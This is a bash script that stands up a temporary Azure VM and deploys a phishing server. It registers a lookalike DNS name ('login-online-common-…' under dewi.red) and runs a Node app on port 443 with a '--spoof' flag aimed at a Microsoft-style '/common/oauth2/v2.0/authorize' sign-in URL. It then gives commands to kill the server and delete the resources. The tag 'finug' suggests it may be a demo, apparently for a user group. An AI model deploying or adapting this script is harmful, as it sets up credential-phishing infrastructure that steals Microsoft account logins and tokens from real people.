
rm zipfile.zip;zip zipfile.zip . -r
rm tempkeys -rf
mkdir tempkeys
ssh-keygen -t rsa -b 4096 -C "tempkey" -f "tempkeys/tempkey" -N ""
chmod 700 tempkeys
chmod 600 tempkeys/*

ids=$RANDOM
vm="finugVM-$ids"
location=westeurope
pw=$(cat /proc/sys/kernel/random/uuid)"\+1\!Sda"
MY_IP_ADDRESS=$(curl -s ifconfig.me)/32
vmRg=rg-$vm
storageAcc=storage$(head /dev/urandom | tr -dc a-z | head -c10)

az group create -n $vmRg \
-l $location \
--tags="svc=finug"

# or get existing 

nsg=$(az network nsg create --name tempNSG --resource-group $vmRg --location $location)
nsgId=$( echo $nsg | jq -r '.NewNSG.id' )
scope=$( echo $nsg | jq -r '.NewNSG.id' | cut -d "/" -f2,3,4,5)
az network nsg rule create --name "allow-my-ip" --nsg-name tempNSG --resource-group $vmRg --priority 100 --source-address-prefixes $MY_IP_ADDRESS --destination-address-prefixes '*' --access Allow --protocol "*" --direction Inbound --destination-port-ranges '*'

# Add new IP

vmOut=$(az vm create --resource-group $vmRg \
--name $vm \
--nsg $nsgId \
--image Ubuntu2204 \
--nic-delete-option delete \
--os-disk-delete-option delete \
--public-ip-sku basic \
--admin-username azureuser \
--ssh-key-values tempkeys/tempkey.pub
)


ip=$(echo $vmOut | jq -r '.publicIpAddress');echo $ip

# Define variables
dnsName="dewi.red" # Your DNS zone name
dnsResourceGroup="RG-DNS" # Your resource group name
recordSetName="login-online-common-$ids" # Replace $ids with the actual value

az network dns record-set a add-record --resource-group $dnsResourceGroup --zone-name $dnsName --record-set-name $recordSetName --ipv4-address $ip

sleep 5;


ssh -i tempkeys/tempkey azureuser@$ip '
    sudo apt update -y;
    sudo apt install jq -y;
    sudo apt install unzip -y;
    # Install NVM
    curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.1/install.sh | bash;
    # Append NVM setup commands to .bashrc
    echo "export NVM_DIR=\"\$HOME/.nvm\"" >> ~/.bashrc
    echo "[ -s \"\$NVM_DIR/nvm.sh\" ] && \\. \"\$NVM_DIR/nvm.sh\"" >> ~/.bashrc
    echo "[ -s \"\$NVM_DIR/bash_completion\" ] && \\. \"\$NVM_DIR/bash_completion\"" >> ~/.bashrc

    # Explicitly source NVM
    export NVM_DIR="$HOME/.nvm"
    [ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"
    [ -s "$NVM_DIR/bash_completion" ] && \. "$NVM_DIR/bash_completion"

    # Now run NVM and Node commands
    nvm install node
    node -v


    # Source the .bashrc file to apply changes immediately
    source ~/.bashrc
    mkdir ~/demo

'

# Copy executables

scp -i tempkeys/tempkey zipfile.zip azureuser@$ip:~/demo/zipfile.zip

#

# SSH into the server and execute the commands
ssh -i tempkeys/tempkey azureuser@$ip "
    # Explicitly source NVM
    export NVM_DIR=\"\$HOME/.nvm\"
    [ -s \"\$NVM_DIR/nvm.sh\" ] && \". \"\$NVM_DIR/nvm.sh\"
    [ -s \"\$NVM_DIR/bash_completion\" ] && \". \"\$NVM_DIR/bash_completion\"

    # Unzip the file
    unzip -o ~/demo/zipfile.zip -d ~/demo/

    # Change directory to where the app is
    cd ~/demo/
"


echo "cd demo; sudo /home/azureuser/.nvm/versions/node/v21.2.0/bin/node app.js --spoof=$recordSetName.$dnsName/common/oauth2/v2.0/authorize?client_id=d0b11f2bd-cc4f-474f-afd4-671c09ba1a37 --port=443" | ssh -i tempkeys/tempkey azureuser@$ip



# to kill
ssh -i tempkeys/tempkey azureuser@$ip

sudo kill -9 $(sudo lsof -t -i :443)





#WSL or other Linux distro
G=$(az group list --tag 'svc=finug' --query "[].{name:name}" -o tsv) 

for res in $G
do
 echo "az group delete --id $res"
 az group delete --name $res --no-wait -y
done

az network dns record-set a remove-record --resource-group $dnsResourceGroup --zone-name $dnsName --record-set-name $recordSetName --ipv4-address $ip


 rm tempkeys -rf
